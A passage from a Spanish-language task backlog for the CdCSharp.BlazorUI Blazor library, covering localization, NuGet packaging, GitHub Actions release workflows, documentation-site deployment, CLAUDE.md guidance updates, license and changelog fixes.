  6. Test de integración: renderizar `BUICultureSelector` bajo `es-ES` → aria-label contiene "Seleccionar idioma".
- **Notas**: dependencia con `A11Y-xx` (aria-label del selector actualmente inexistente). Cross con `SEC-05` si se decide logging en fallback. Decisión D-17 (ver §Directivas de diseño): componentes deben estar localizados; `.resx` en inglés (neutral) y español es baseline para 1.0.

### `L10N-04` — `Localization.Server` y `Localization.Wasm` no se empaquetan como NuGet (ver `ARCH-04`): consumers no pueden instalarlos

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.Localization.Server/*.csproj`; `src/CdCSharp.BlazorUI.Localization.Wasm/*.csproj`; `.github/workflows/publish.yml:182-219`.
- **Evidencia**: `publish.yml` sólo empaqueta `Core`, `BlazorUI`, `BuildTools`. Los dos csproj de Localization no tienen `PackageId`, `Authors`, `Description`, y **no** son invocados por `dotnet pack` en CI. Sin embargo, `BUICultureSelector` es una feature anunciada; consumers que la quieran usar necesitan el paquete.
- **Criterios de aceptación**:
  1. Añadir metadata NuGet completa a ambos csproj (siguiendo `DOC-03` template vía `Directory.Build.props`).
  2. Añadir step pack en `publish.yml` para los dos proyectos.
  3. Si tras `L10N-01` se consolida el componente en `CdCSharp.BlazorUI`, los paquetes de Localization se convierten en **extensiones** ligeras (sólo `DI extensions` + `PersistenceStrategy`), no en contenedores de componentes.
- **Notas**: duplica parcialmente `ARCH-04` (que lo listó como blocker de publish). Este task describe el contexto L10N-específico.

### `CI-01` — Workflow `publish.yml` sólo empaqueta 3 proyectos de 8 publicables: desincronizado con el grafo de soluciones

- **Estado**: ✅ Resuelto (commit `caca0ac`) — `publish.yml` pasa a empaquetar **7 proyectos** publicables (Core, SyntaxHighlight, BlazorUI, Localization.Server, Localization.Wasm, **FluentValidation** — nuevo — y BuildTools), cubriendo todos los `IsPackable=true`. La cobertura inicial de 3 quedó obsoleta tras ARCH-04 (Localization), ARCH-02 (SyntaxHighlight) y este cambio (FluentValidation). Criterio 2 (`IsPackable=false` en tests/samples/docs/tools) ya lo aplica el `Directory.Build.props` raíz con `<IsPackable>false</IsPackable>` como default — los projects shippables opt-in explícitamente con `true`. Criterio 3 (analyzers NO como paquetes standalone, se bundlean vía el consumidor) es estado actual verificado: `CodeGeneration`/`Core.CodeGeneration` no están en la pack list y se consumen vía `<ProjectReference OutputItemType="Analyzer" ReferenceOutputAssembly="false" />`. Criterio 4 (metadata completa en Localization + SyntaxHighlight) fue cerrado por ARCH-04/ARCH-02. Release notes en el workflow se actualizan para listar los 7 paquetes. No se migra a `dotnet pack CdCSharp.BlazorUI.slnx` (criterio 1 original) porque empaquetaría analyzer projects sin control fino; la lista explícita es más segura.
- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `.github/workflows/publish.yml:196-216` (steps `Pack NuGet Packages`, `Publish to NuGet`).
- **Evidencia**:
  ```yaml
  dotnet pack src/CdCSharp.BlazorUI.Core/CdCSharp.BlazorUI.Core.csproj ...
  dotnet pack src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj ...
  dotnet pack src/CdCSharp.BlazorUI.BuildTools/CdCSharp.BlazorUI.BuildTools.csproj ...
  ```
  La SLN `CdCSharp.BlazorUI.slnx` define 8 proyectos en `src/` susceptibles de publicación:
  - `CdCSharp.BlazorUI.Core` ✅ packea
  - `CdCSharp.BlazorUI` ✅ packea
  - `CdCSharp.BlazorUI.BuildTools` ✅ packea
  - `CdCSharp.BlazorUI.CodeGeneration` ❌ no packea (analyzer)
  - `CdCSharp.BlazorUI.Core.CodeGeneration` ❌ no packea (analyzer)
  - `CdCSharp.BlazorUI.SyntaxHighlight` ❌ no packea (dep de `BlazorUI`; `CodeBlock`)
  - `CdCSharp.BlazorUI.Localization.Server` ❌ no packea
  - `CdCSharp.BlazorUI.Localization.Wasm` ❌ no packea
  - Consumer que intente instalar `CdCSharp.BlazorUI.Localization.Server` o `CdCSharp.BlazorUI.SyntaxHighlight` → `PackageNotFound`.
- **Criterios de aceptación**:
  1. Cambiar pipeline a empaquetar la solución completa con `dotnet pack CdCSharp.BlazorUI.slnx -c Release -o ./artifacts -p:PackageVersion=...` (respetando `IsPackable` en cada csproj).
  2. Marcar `<IsPackable>false</IsPackable>` en proyectos `Tests`, `Samples`, `Docs`, `Tools`, `MaterialIconsScrapper` para excluirlos.
  3. Los analyzers (`*.CodeGeneration`) se empaquetan vía el paquete consumidor (p. ej. `CdCSharp.BlazorUI` incluye `Core.CodeGeneration` en `analyzers/dotnet/cs/`), NO como paquetes standalone — documentarlo.
  4. `SyntaxHighlight` y ambos `Localization.*` requieren metadata NuGet completa (ver `DOC-03`, `L10N-04`) antes de añadir al `pack`.
- **Notas**: duplica el síntoma de `ARCH-04`/`L10N-04`/`DOC-03` pero desde la perspectiva del workflow. Cierra el loop: sin este cambio en `publish.yml`, la metadata añadida en los csproj no produce artefactos.

### `CI-02` — `actions/create-release@v1` archivado (no mantenido desde 2021): riesgo funcional + supply chain

- **Estado**: ✅ Resuelto (colateralmente por `ARCH-07`, commit `2341f61`) — `publish.yml` usa `softprops/action-gh-release@v2` (mantenida activamente, 9k+ stars, OIDC-capable). `actions/create-release@v1` (archivada 2021) ya no aparece en el workflow. Tarea duplicada con ARCH-07.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml:240-259`.
- **Evidencia**:
  ```yaml
  - name: Create GitHub Release
    if: startsWith(github.ref, 'refs/tags/v')
    uses: actions/create-release@v1
  ```
  - `actions/create-release` es un repositorio **archived** desde 2021 ([ref](https://github.com/actions/create-release)). Sin bug fixes, sin parches de seguridad. GitHub recomienda `softprops/action-gh-release` o la CLI `gh release create`.
  - El body del release está hardcoded con lista estática de paquetes; no se actualiza si `CI-01` añade más.
- **Criterios de aceptación**:
  1. Reemplazar por `softprops/action-gh-release@v2` con `body_path:` apuntando a un archivo `RELEASE_NOTES.md` extraído del `CHANGELOG.md` en un step previo (ver `REL-02`).
  2. **[Decisión F1 D-18]** **NO** usar `--generate-notes`: la fuente de verdad del changelog es `CHANGELOG.md` manual (Keep a Changelog). El step previo corre `awk`/`sed` sobre `CHANGELOG.md` para extraer la sección `## [X.Y.Z]` correspondiente al tag y volcarla a `RELEASE_NOTES.md`.
  3. Adjuntar los `.nupkg` y `.snupkg` como assets del release (permite install offline + auditoría).
  4. Ejemplo de extracción:
     ```yaml
     - name: Extract release notes
       run: |
         VERSION=${GITHUB_REF_NAME#v}
         awk "/^## \[$VERSION\]/{flag=1; next} /^## \[/{flag=0} flag" CHANGELOG.md > RELEASE_NOTES.md
     ```
- **Notas**: GitHub publica deprecaciones oficialmente pero `actions/create-release@v1` nunca se marcó como fallado; sigue funcionando pero no lo estará para siempre. Cambio trivial, alto valor. Decisión D-18 (ver §Directivas de diseño): CHANGELOG manual como fuente única, `--generate-notes` descartado.

### `CI-03` — Falta `concurrency` group: push rápido a `develop` dispara ejecuciones concurrentes que compiten al publicar a NuGet

- **Estado**: ✅ Resuelto (colateralmente por `ARCH-13`, commit `39b839a`) — el `concurrency:` block ya declarado en `publish.yml` cumple criterios 1-2: `group: publish-${{ github.workflow }}-${{ github.ref }}`, `cancel-in-progress: ${{ !startsWith(github.ref, 'refs/tags/') }}`. Tags nunca se cancelan (releases immutable); ramas `develop`/PR sí. Tarea duplicada con `ARCH-13`. Criterio 3 (split ci.yml/publish.yml) queda como follow-up sin valor inmediato.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml:1-9` (top-level).
- **Evidencia**:
  - No hay `concurrency:` declarado → dos pushes sucesivos a `develop` lanzan dos jobs en paralelo; ambos calcularán versiones `1.0.{run_number1}-preview.{run_number1}` y `1.0.{run_number2}-preview.{run_number2}`. Si la ejecución con `run_number` menor termina después, publica una versión con ordering incorrecto en NuGet (las previews no se ordenan por run).
  - Peor caso con tags: si un push a `develop` y un tag `v1.0.0` coinciden, ambos empujan simultáneamente a NuGet — posible doble consumo de API key + race con `--skip-duplicate`.
- **Criterios de aceptación**:
  1. Añadir al inicio del workflow:
     ```yaml
     concurrency:
       group: publish-${{ github.ref }}
       cancel-in-progress: false
     ```
  2. Para tags (`v*`) mantener `cancel-in-progress: false` (nunca cancelar un release).
  3. Opcional: separar `ci.yml` (sin concurrency, siempre corre) de `publish.yml` (con concurrency + triggers restringidos).
- **Notas**: riesgo probabilístico (raro pero caro cuando ocurre). Bug silencioso hasta que se ve un paquete "antiguo" en NuGet con fecha de publicación nueva.

### `CI-04` — `dotnet pack` sólo corre en rama `develop`/tags/dispatch manual: pull requests no validan que el packaging funcione

- **Estado**: ✅ Resuelto (commit `8b24083`, criterios 1-3 aplicados) — `publish.yml` quita el `if: should_publish == 'true'` del step **Pack NuGet Packages** → corre siempre, PRs incluidos. Añade step **Upload Package Artifacts** (`actions/upload-artifact@v4`, retención 14 días, key `nupkgs-${version}`, fallo si no hay artefactos) para que los revisores puedan descargar y test-install desde el PR. `Publish to NuGet` sigue siendo el único gateado por `should_publish`. Criterio 4 (`EnablePackageValidation` como gate efectivo del PR) queda automático: cuando `PKG-10` encienda validation, cualquier breaking change activa ahora desde el PR en lugar del push-post-merge.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `.github/workflows/publish.yml:183-184` (`if: steps.version.outputs.should_publish == 'true'`).
- **Evidencia**:
  - `Pack NuGet Packages` se gatea por `should_publish`. En PRs (`pull_request` a `main`/`develop`) y en push a `main`, `should_publish="false"` → `dotnet pack` nunca corre.
  - Consecuencia: un PR puede introducir un breaking change en `<PackageId>`, `<TargetFramework>`, `EnablePackageValidation` baseline, `IsPackable`, dependencias NuGet — y **no se detecta hasta el push a `develop` post-merge**.
  - Con `EnablePackageValidation=true` (ver `PKG-10`) esto es especialmente dañino: el fallo de validación ocurre sólo en la rama ya mergeada, no bloquea el PR.
- **Criterios de aceptación**:
  1. Mover `dotnet pack -o ./artifacts ...` a un step separado que corra **siempre** (sin `if`), con `-p:PackageVersion=${{ version }}` de la rama.
  2. Gatear sólo `dotnet nuget push` por `should_publish`.
  3. (Opcional) Subir los `.nupkg` como artifact de PR (`actions/upload-artifact@v4`) para poder inspeccionarlos.
  4. Con este cambio, `EnablePackageValidation` actúa como gate efectivo del PR.
- **Notas**: cross con `PKG-10`, `PKG-02`. También habilita "test install" en PRs (instalar el paquete desde artifacts en un proyecto de sample durante CI).

### `DOCS-WASM-01` — Sitio de docs declara `en-US` + `es-ES` pero sólo existe 1 archivo `.resx`: 95% de los `IStringLocalizer<T>[...]` cae al key-fallback

- **Severidad**: Minor (reclasificada — ver decisión D-16)
- **Esfuerzo**: L (fase posterior)
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/Resources/Pages/**/*.resx`; `Program.cs:13-21`; todas las 26 páginas `Pages/Components/*.razor` que inyectan `IStringLocalizer<T>`.
- **Evidencia**:
  ```bash
  $ ls docs/CdCSharp.BlazorUI.Docs.Wasm/Resources/Pages/Components/
  DateTimePage.es.resx          # único archivo
  ```
  `Program.cs` declara `SupportedCultures = [ "en-US", "es-ES" ]` y el layout expone `BUICultureSelector`. Con sólo `DateTimePage.es.resx`, cualquier otro componente cae al fallback (la key literal, que es inglés). Consecuencia: al seleccionar `es-ES` en el selector, toda la documentación sigue en inglés excepto la página de DateTime.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-16]** Mantener el soporte bilingüe declarado (`en-US` + `es-ES`) y el `BUICultureSelector` visible en el layout de docs. **No** se retira el selector en 1.0.
  2. Marcar como debt-tracked: crear issue en GitHub `docs: complete es-ES translation coverage` con enlaces a las 26 páginas pendientes. No bloquea la release 1.0.
  3. Automatizar la extracción de keys (script pwsh o `dotnet-xliff`) para mantener los `.resx` sincronizados con los `Loc[..]` del código — trabajo auxiliar que habilita la traducción incremental.
  4. CI check que falle si un `Loc["..."]` no existe como key en el `.resx` default (ver `DOCS-WASM-03`). Este gate sigue siendo útil aunque la cobertura `es` sea parcial.
  5. Añadir banner/nota en páginas sin traducción al seleccionar `es-ES`: "Translation in progress — contributions welcome".
- **Notas**: cross con `L10N-03` (el mismo patrón en componentes de la librería) y `L10N-11` (setup docs). Decisión D-16 (ver §Directivas de diseño): soporte bilingüe se mantiene; cobertura `.resx` es trabajo de fase posterior, no release blocker.

### `DOCS-WASM-02` — `NavMenu.razor` hardcodea 100% del texto navigacional sin `IStringLocalizer`: inconsistente con el resto del sitio

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/Layout/NavMenu.razor:1-78`.
- **Evidencia**: todos los `Text="Components"`, `Text="Forms"`, `Text="Button"`, `Text="Architecture"`, etc. están hardcoded en inglés. Otras páginas (`ButtonPage.razor`) sí usan `@inject IStringLocalizer<ButtonPage> Loc` + `@Loc["..."]`. Al cambiar de cultura, la navegación queda en inglés mientras el contenido de página podría cambiar (si el `.resx` existe).
- **Criterios de aceptación**:
  1. Inyectar `IStringLocalizer<NavMenu> Loc` en `NavMenu.razor`.
  2. Reemplazar cada `Text="..."` por `Text="@Loc[\"...\"]"`.
  3. Crear `Resources/Layout/NavMenu.resx` (default/en) + `NavMenu.es.resx` con las traducciones.
  4. Verificar con el selector de cultura que la navegación se re-renderiza con la cultura activa.
- **Notas**: depende de `DOCS-WASM-01` (estrategia general); puede entregarse en paralelo.

### `DOCS-WASM-03` — Sin workflow CI para build + deploy del sitio de docs: publicación manual desde local, sin versionado

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `.github/workflows/` (workflow nuevo `docs.yml`); `docs/CdCSharp.BlazorUI.Docs.Wasm/`.
- **Evidencia**:
  - No existe workflow dedicado al deploy de docs. `publish.yml` sólo publica paquetes NuGet.
  - El sitio existe en `wwwroot` pero no hay `gh-pages` branch, no hay `GitHub Pages` configurado, no hay `Azure Static Web Apps`, no hay `Cloudflare Pages`. El link `GitHub` del header apunta al repo pero no a un sitio vivo.
  - Docs desincronizadas con releases: tras un bump de versión, las docs siguen mostrando la versión anterior hasta build+deploy manual.
- **Criterios de aceptación**:
  1. Crear `.github/workflows/docs.yml` con triggers `push: branches: [main]` y `workflow_dispatch`.
  2. Job: `dotnet publish docs/CdCSharp.BlazorUI.Docs.Wasm -c Release -o out/`, luego `actions/upload-pages-artifact@v3` + `actions/deploy-pages@v4`.
  3. Habilitar `Settings → Pages → Source: GitHub Actions`.
  4. Configurar `<StaticWebAssetBasePath>CdCSharp.BlazorUI</StaticWebAssetBasePath>` en el csproj para subpath `/CdCSharp.BlazorUI/`.
  5. Añadir URL del sitio al `README.md` (cross con `DOC-11`).
- **Notas**: cross con `CI-01`/`REL-xx`. Para custom domain, DNS + `CNAME` en `wwwroot/`. GitHub Pages gratis para public repos.

### `DOCS-WASM-04` — `BlazorWebAssemblyLoadAllGlobalizationData=true` añade ~1 MB al bundle aunque sólo se declaren 2 cultures

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/CdCSharp.BlazorUI.Docs.Wasm.csproj:8`.
- **Evidencia**:
  ```xml
  <BlazorWebAssemblyLoadAllGlobalizationData>true</BlazorWebAssemblyLoadAllGlobalizationData>
  ```
  carga ICU data completo (~1.3 MB uncompressed). Con sólo `en-US` + `es-ES` declarados en `Program.cs`, es overprovisioning.
- **Criterios de aceptación**:
  1. Cambiar a `<BlazorWebAssemblyLoadAllGlobalizationData>false</BlazorWebAssemblyLoadAllGlobalizationData>` (o removerlo — false es default).
  2. Añadir `<HybridGlobalization>true</HybridGlobalization>` (net8+): delega formateo de fechas/números al runtime del browser (`Intl` API), elimina ICU data del bundle.
  3. Verificar que `BUIInputDateTime`, `BUIInputNumber` formatean correctamente en ambas cultures declaradas.
  4. Documentar trade-off: hybrid globalization no soporta todas las features de `CultureInfo`; para casos exóticos (calendarios no-gregorianos) volver a `true`.
- **Notas**: impacto significativo en TTI del docs site. Cross con `PERF-xx`. Si el docs site se ampliase a 20 cultures, reconsiderar.

### `CLAUDE-01` — Catch triad documentada en CLAUDE.md §Async es incompleta: omite `ObjectDisposedException` y `JSException`

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `CLAUDE.md:165` (sección `## Async / JS interop conventions`).
- **Evidencia**:
  ```
  - **JS interop disposal**: wrap `IJSObjectReference` / `InvokeVoidAsync` calls during teardown paths in
    `try/catch (JSDisconnectedException) { } catch (InvalidOperationException) { }` — prerendering and
    circuit-shutdown both raise these and they are not actionable.
  ```
  El análisis (§3.11 ASYNC, §3.12 JS, §3.22 DOCS-WASM, §3.20 L10N) identificó múltiples sitios donde la tripleta real es `JSDisconnectedException + InvalidOperationException + ObjectDisposedException + JSException`. La doc en CLAUDE.md documenta sólo 2/4 → developers siguen la guía y dejan pasar `ObjectDisposedException` (disposal race) y `JSException` (módulo falta en bundle).
- **Criterios de aceptación**:
  1. Ampliar la sección §Async:
     ```
     try { await _module.InvokeVoidAsync(...); }
     catch (JSDisconnectedException) { }        // circuit shutdown
     catch (InvalidOperationException) { }      // prerender
     catch (ObjectDisposedException) { }        // component disposal race
     catch (JSException) { }                    // module load failure (404, syntax error)
     ```
  2. Documentar que `JSException` es opcional si el call NO es un import del módulo (ya está cargado).
  3. Añadir snippet reutilizable como extension method `SafeInvokeAsync<T>` en `Core/Abstractions/Behaviors/Javascript/` y referenciar desde CLAUDE.md.
- **Notas**: cross con `ASYNC-xx`, `JS-xx`, `L10N-09`, `DOCS-WASM-05`. Arreglar en CLAUDE.md primero → luego resolver los sitios que caen en la tripleta canónica se vuelve un fix mecánico.

### `CLAUDE-02` — CLAUDE.md §Release/versioning desincronizado con `publish.yml` real: omite tests, sym packages, alcance parcial de pack

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `CLAUDE.md:273-282` (sección `## Release / versioning`).
- **Evidencia**:
  ```
  - Push to `develop` → auto-publishes `1.0.{run}-preview.{run}` to NuGet.
  - Tag `vX.Y.Z` → publishes `X.Y.Z` and creates a GitHub release.
  - Push to `main` → builds only, does not publish.
  - Manual `workflow_dispatch` with `publish=true` required for ad-hoc publishes.
  ```
  - No menciona qué paquetes se empaquetan (sólo 3 de los ~8 csproj — ver `CI-01`).
  - No menciona el orden build: CodeGeneration → Core → Main → BuildTools (sí aparece en §Common commands:31 pero fuera de contexto).
  - No documenta `--no-symbols` (`CI-06`) ni que `.snupkg` no llega a nuget.org.
  - No menciona que `workflow_dispatch` + `publish=true` NO requiere tag; colisión de versiones posible.
- **Criterios de aceptación**:
  1. Reescribir §Release para incluir:
     - Lista explícita de paquetes publicados vs. no publicados.
     - Estado actual del flujo de símbolos (`.snupkg`).
     - Concurrency & race conditions (ver `CI-03`).
     - Checklist de pre-release (ver §3.24 REL).
  2. Incluir link a `.github/workflows/publish.yml` para deep-dive.
  3. Cross-ref con `TASKS.md` (sección CI, PKG).
- **Notas**: CLAUDE.md es el onboarding doc para devs + agentes. Desincronización con workflow = misinformation.

### `CLAUDE-03` — Cross-references rotas: `CLAUDE-02`, `CLAUDE-03`, `CLAUDE-04`, `CLAUDE-05` citados en TASKS.md pero nunca definidos

- **Estado**: ✅ Resuelto (commit `4290e2b`) — criterio 1 cumplido de facto: las 4 IDs huérfanas originales ya tienen su `### \`CLAUDE-NN\`` en TASKS.md (verificado: 274 task IDs definidas, 133 referenciadas, 0 dangling). Criterio 4 implementado: nuevo `scripts/check-task-refs.ps1` enumera todas las referencias `XXX-NN` dentro de backticks (excluyendo los headers que las definen) y exige header coincidente; sale con `::error::` + exit 1 si encuentra dangling. Wired al workflow `release-gate.yml` como job `task-refs-check` antes de `severity-check`, y reportado en el summary final. Cualquier PR a `main` que añada una referencia a una task fantasma fallará el gate.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `TASKS.md` (secciones anteriores); `CLAUDE.md`.
- **Evidencia**:
  ```
  $ grep -n 'CLAUDE-\d' TASKS.md
  166:  3. Documentar la decisión en `CLAUDE.md` (ver `CLAUDE-02`).
  566:  3. ... (alimenta `CLAUDE-03`) la política de estilos globales...
  1970:  2. ... (alimenta `CLAUDE-04`) que `package-lock.json` es producto secundario...
  3263:  2. Documentar decisión en `CLAUDE.md` → `CLAUDE-05`.
  ```
  Tasks anteriores piden "documentar en CLAUDE-02/03/04/05" pero esas tasks no existen en TASKS.md. Riesgo: implementadores cierran la cross-ref sin documentar, o abren una task nueva duplicando.
- **Criterios de aceptación**:
  1. Para cada referencia, definir la task explícitamente en este §3.23 (las que corresponden se escriben ahora bajo este task).
  2. `CLAUDE-02` refiere docs de release → cubierto por esta misma task.
  3. Alternativamente, renumerar todas las refs al ID real una vez este bloque se cierre.
  4. CI check que falle si hay `CLAUDE-XX` referenciado sin definir en TASKS.md.
- **Notas**: patrón general en todos los proyectos con TASKS.md largo; un linter de refs internas ayuda.

### `CLAUDE-04` — Ausencia de tabla "Cuándo NO seguir esta guía": CLAUDE.md describe reglas, no excepciones

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `CLAUDE.md` (nueva sección al final).
- **Evidencia**:
  - §Component architecture dice: "All components derive from `BUIComponentBase`. Do not inherit directly from `ComponentBase`". Pero `BUIInputDropdown` se aparta del patrón (documentado en §Component architecture:68, pero no destacado como excepción).
  - §CSS architecture dice: "do not add component-specific CSS classes to express state". Pero hay contraejemplos (ver `CSS-SCOPED-xx` tasks — class `active` en flag-buttons del CultureSelector).
  - §Async dice: "do not use ConfigureAwait(false)". Pero hay 0 excepciones aceptables (p. ej. métodos `internal` de ayuda que nunca tocan UI).
  - Cuando las reglas admiten excepciones sin documentarlas, el dev las aplica en sitios indebidos o las viola sin criterio.
- **Criterios de aceptación**:
  1. Añadir sección `## Exceptions and trade-offs` enumerando:
     - `BUIInputDropdown` vs `BUIInputComponentBase`.
     - Cuándo un class `.bui-xxx--state` es aceptable (p. ej. no existe un `data-bui-*` equivalente y sería over-engineering añadirlo).
     - Cuándo `ConfigureAwait(false)` es aceptable (métodos CPU-bound no marcados como `async`).
  2. Cada excepción cita un task ID (`CLAUDE-EXC-XX`) o commit como referencia histórica.
  3. Reglas sin excepciones conocidas se marcan explícitamente: "(no known exceptions)".
- **Notas**: aumenta madurez del doc. Previene "ese código no sigue las reglas" bikeshedding cuando hay un trade-off legítimo.

### `REL-01` — `LICENSE.txt` tiene placeholders sin sustituir `[year]` y `[fullname]`: licencia técnicamente inválida ante disputa

- **Estado**: ✅ Resuelto (commit `31b275d`) — `LICENSE.txt` sustituye `[year] [fullname]` por `2026 Samuel Maícas (@cdcsharp)`, alineado con D-01 y con el copyright declarado en `Directory.Build.props`.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `LICENSE.txt` (raíz del repo).
- **Evidencia**:
  ```
  MIT License
  Copyright (c) [year] [fullname]
  Permission is hereby granted, free of charge...
  ```
  - `[year]` y `[fullname]` no están sustituidos → el copyright no identifica al titular.
  - nuget.org acepta el paquete porque detecta "MIT License" por heurística, pero legalmente un reclamo de copyright requiere titular identificable.
  - Consumers corporativos con due-diligence de licencias flaggearán esto automáticamente (FOSSA, Snyk License Compliance).
- **Criterios de aceptación**:
  1. **[Decisión F1 D-01]** Reemplazar `[year]` por `2026` y `[fullname]` por `Samuel Maícas (@cdcsharp)`. Texto final: `Copyright (c) 2026 Samuel Maícas (@cdcsharp)`.
  2. Establecer `<Copyright>© 2026 Samuel Maícas (@cdcsharp)</Copyright>` en `Directory.Build.props` (tras `ARCH-05`) para que todos los `.nupkg` lleven el mismo texto.
  3. Añadir `<Authors>Samuel Maícas</Authors>` y `<Company>CdCSharp</Company>` en `Directory.Build.props`.
  4. Registrar email de contacto del maintainer (`samuel.maicas.development@gmail.com`) como `<PackageProjectUrl>` fallback/metadata owner en NuGet y en `SECURITY.md` (ver `REL-06`).
  5. Commitear con mensaje explícito: `docs(license): fill MIT license holder and year`.
- **Notas**: XS fix con alto impacto legal. Blocker absoluto para `1.0.0` release. Decisión D-01 (ver §Directivas de diseño): identidad legal confirmada por maintainer.

### `REL-02` — `CHANGELOG.md` ausente: no hay trazabilidad de cambios entre `1.0.x-preview.N` → `1.0.0`

- **Estado**: ✅ Resuelto (commit `9f1ee98`) — criterio 1 ya cumplido (CHANGELOG.md raíz, formato Keep a Changelog 1.1.0, secciones `[Unreleased]` poblada + placeholder `[1.0.0]`). Criterio 2 implementado en `release-publish.yml` job `publish`: nuevo step "Extract release notes from CHANGELOG.md" extrae con `sed` el bloque entre `## [VERSION]` y el siguiente `## [` o el footer `---`, escribe `RELEASE_NOTES.md`, falla loudly si la sección no existe (`::error::`) y le añade un footer con el comando `dotnet add package`. `softprops/action-gh-release@v2` consume `body_path: RELEASE_NOTES.md` (el body hardcoded anterior se elimina). Criterio 3 (PR template) y criterio 4 (descartar `--generate-notes`, ya descartado de facto — el workflow nunca lo usó) quedan delegados a `CLAUDE-09` (PR template / CONTRIBUTING). Cierra `DOC-04` colateralmente. Cierra el síntoma de release notes opacas para el `1.0.0`.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `CHANGELOG.md` (nuevo); proceso de mantenimiento (PR template).
- **Evidencia**:
  - `ls` de la raíz no lista `CHANGELOG.md`.
  - El workflow `publish.yml` genera GitHub release con body hardcoded (ver `CI-02`), sin extraer changelog.
  - Consumers que instalen `1.0.0-preview.52` y luego `1.0.0` no tienen manera de ver qué cambió.
  - Para una release `1.0.0` es standard práctica incluir CHANGELOG siguiendo [Keep a Changelog](https://keepachangelog.com/).
- **Criterios de aceptación**:
  1. **[Decisión F1 D-18]** Crear `CHANGELOG.md` en raíz con formato Keep a Changelog (mantenido **manualmente**, no auto-generado):
     ```markdown
     # Changelog
     All notable changes to this project will be documented in this file.
     The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
     and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

     ## [Unreleased]

     ## [1.0.0] - 2026-XX-XX
     ### Added
     - Initial public release.
     ```
  2. Modificar `publish.yml`: en tag release, extraer la sección `[X.Y.Z]` del `CHANGELOG.md` y pasarla como body al release (`softprops/action-gh-release@v2` con `body_path: RELEASE_NOTES.md` generado por un step que haga `awk`/`sed` sobre CHANGELOG).
  3. En PR template (`CLAUDE-09`) añadir checklist `- [ ] CHANGELOG.md updated (Unreleased section)`.
  4. **Descartar `--generate-notes`**: el CHANGELOG manual es la única fuente de verdad. Actualizar `CI-02` para alinear.
- **Notas**: cross con `CI-02`, `CLAUDE-09`. Decisión D-18 (ver §Directivas de diseño): CHANGELOG manual es fuente única; `--generate-notes` queda descartado.

### `REL-03` — Gates del checklist §3.24 sin criterios mecánicos: "sin Blockers/Critical" requiere query verificable, no inspección manual

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `ANALYSIS.md §3.24`; `TASKS.md` (headers); script nuevo `scripts/check-release-gate.ps1`.
- **Evidencia**:
  ```
  1. `BLD-*` sin Blockers/Critical.
  6. `A11Y` sin Blockers/Critical.
  7. `ASYNC` sin Blockers/Critical.
  8. `SEC` sin Blockers/Critical.
  ```
  - Estos ítems son semi-estructurados; verificarlos requiere un humano leyendo cada sección de TASKS.md y mapeando a severidad. Propenso a error y a drift cuando se añadan tasks post-cierre.
  - La summary table (líneas 11-37 en TASKS.md) muestra counts pero no distingue "pendiente" de "resuelto".
- **Criterios de aceptación**:
  1. Añadir a cada task una línea `**Estado**: Pendiente | En curso | Resuelto | Wontfix` (o usar checkbox `- [x]` antes del ID).
  2. Escribir script `scripts/check-release-gate.ps1` que parsee TASKS.md y falle si hay Blocker/Critical pendiente en cualquier área.
  3. Ejecutar script en el workflow `publish.yml` **antes** del tag release (gate automático).
  4. Idealmente, `TASKS.md` pasa a ser generado/actualizado por un script + issue tracker (GitHub Issues con labels `severity:blocker`, etc.).
- **Notas**: convierte gates de "guideline" a "policy enforced by CI". Sin esto el release checklist es un honor system.

### `REL-04` — Sin proceso de `1.0.0-rc.N` intermedio: salto directo `preview.N` → `1.0.0` sin validación externa

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `.github/workflows/publish.yml` (lógica de versionado); CLAUDE.md §Release; `ANALYSIS.md §3.24`.
- **Evidencia**:
  - `publish.yml` genera `1.0.{run}-preview.{run}` en `develop` y `X.Y.Z` en tag. No hay stage `rc` ni `beta`.
  - `preview` en SemVer denota "testing en progreso"; `rc` denota "candidato estable, feature-complete". Un consumer no diferencia entre "aún iteramos" y "esto va a ser 1.0".
  - Saltar de `preview.52` a `1.0.0` sin RC impide a integradores tempranos validar contra la versión exacta que será GA.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-19]** Política RC: **sólo antes de cambios major**. Ejemplo: `v2.0.0-rc.1` precede `v2.0.0`. Minors (`1.1.0`, `1.2.0`) y patches (`1.0.1`) publican directo desde `preview.N` sin stage RC intermedio.
  2. Workflow: tag con suffix `-rc.N` publica a NuGet con `IsPrerelease=true`. Aplica sólo cuando el número major aumenta respecto a la última release GA.
  3. Feature freeze en rama `release/X.0.0` cuando se corta `rc.1`; sólo bugfixes mergean.
  4. RC válido mínimo 7 días en la wild antes de retag → `vX.0.0`.
  5. Documentar en CLAUDE.md §Release (cross con `CLAUDE-02`): "RC gate is major-only; minors/patches skip RC".
- **Notas**: cross con `REL-03` (gate check se puede relajar en RC vs GA). Adelgaza riesgo de regresión en breaking changes sin sobrecargar el proceso de releases incrementales. Decisión D-19 (ver §Directivas de diseño): RC sólo para majors.

---

## Minor

### `BLD-11` — Campos privados sin uso en `BUIInputNumber` (CS0414 × 3)

- **Estado**: ✅ Resuelto (commit `4b79cb2`) — eliminados los 3 campos (`_isIncrementing`, `_isDecrementing`, `_preventStepKeyDown`) y todas sus asignaciones; no había lecturas en ninguna parte del componente ni del markup.
